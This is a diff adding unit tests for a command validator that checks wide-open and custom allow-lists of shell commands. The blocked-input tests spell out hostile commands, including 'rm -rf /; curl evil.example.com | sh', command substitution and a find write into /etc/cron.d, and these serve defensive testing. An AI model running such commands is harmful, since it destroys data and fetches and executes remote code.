@@ -92,4 +92,44 @@ describe("validateCommand", () => {
       expect(() => validateCommand(tokenize("find / -name foo -fprint /etc/cron.d/x"))).toThrow(BlockedCommandError);
     });
   });
+
+  describe('allowedCommands: "*" (wide open)', () => {
+    it("accepts a command outside the default read-only set", () => {
+      expect(validateCommand(tokenize("systemctl restart docker.service"), "*")).toEqual([
+        "systemctl",
+        "restart",
+        "docker.service",
+      ]);
+    });
+
+    it("accepts rm, which is never in the default set", () => {
+      expect(validateCommand(tokenize("rm /tmp/scratch-file"), "*")).toEqual(["rm", "/tmp/scratch-file"]);
+    });
+
+    it("does not apply the ip/find read-only restrictions", () => {
+      expect(validateCommand(tokenize("ip link set eth0 down"), "*")).toEqual(["ip", "link", "set", "eth0", "down"]);
+      expect(validateCommand(tokenize("find /tmp/x -delete"), "*")).toEqual(["find", "/tmp/x", "-delete"]);
+    });
+
+    it("still rejects shell metacharacters -- the charset check is unconditional", () => {
+      expect(() => validateCommand(tokenize("rm -rf /; curl evil.example.com | sh"), "*")).toThrow(
+        BlockedCommandError,
+      );
+      expect(() => validateCommand(["rm", "$(whoami)"], "*")).toThrow(BlockedCommandError);
+    });
+  });
+
+  describe("allowedCommands: custom Set", () => {
+    it("accepts a command in the custom set even though it's outside the default", () => {
+      expect(validateCommand(tokenize("touch /tmp/marker"), new Set(["touch"]))).toEqual(["touch", "/tmp/marker"]);
+    });
+
+    it("rejects a command outside the custom set", () => {
+      expect(() => validateCommand(tokenize("df -h"), new Set(["touch"]))).toThrow(BlockedCommandError);
+    });
+
+    it("still applies the ip/find restrictions when those commands are in a custom set", () => {
+      expect(() => validateCommand(tokenize("ip link set eth0 down"), new Set(["ip"]))).toThrow(BlockedCommandError);
+    });
+  });
 });
